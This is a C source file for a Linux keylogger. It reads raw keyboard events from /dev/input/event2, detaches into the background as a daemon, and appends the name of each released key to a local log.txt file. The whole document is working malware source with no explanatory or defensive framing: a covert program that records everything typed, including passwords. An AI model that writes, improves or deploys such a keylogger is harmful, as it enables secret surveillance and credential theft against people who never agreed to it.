#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include "daemonize.c"

static const char *teclado[] =
{
    "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
    "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
    "o", "p", "[", "]", "ENTER", "L_CTRL", "a", "s", "d", "f", "g", "h",
    "j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x", "c", "v", "b",
    "n", "m", ",", ".", "/", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK", 
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK",
    "SCROLL_LOCK", "NUMPAD_7", "NUMPAD_8", "NUMPAD_9", "-", "NUMPAD_4", "NUMPAD5",
    "NUMPAD_6", "+", "NUMPAD_1", "NUMPAD_2", "NUMPAD_3", "INS", "DEL", "UK", "UK", "UK",
    "F11", "F12", "UK", "UK",    "UK", "UK",    "UK", "UK", "UK", "R_ENTER", "R_CTRL", "/", 
    "PRT_SCR", "R_ALT", "UK", "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
    "DOWN",    "PAGE_DOWN", "INSERT", "DELETE", "UK", "UK", "UK", "UK","UK", "UK", "UK", 
    "PAUSE"
};

int main(int argc, char **argv)
{
    struct input_event ev;
    int keyboard = open("/dev/input/event2", O_RDONLY);
    FILE *fp = fopen("log.txt", "a");
    daemonize();
    while (1)
    {
        read(keyboard, &ev, sizeof(ev));
        if ((ev.type == EV_KEY) && (ev.value == 0))
        {
            fprintf(fp, "%s\n", teclado[ev.code]);
            fflush(fp);
        }
    }
}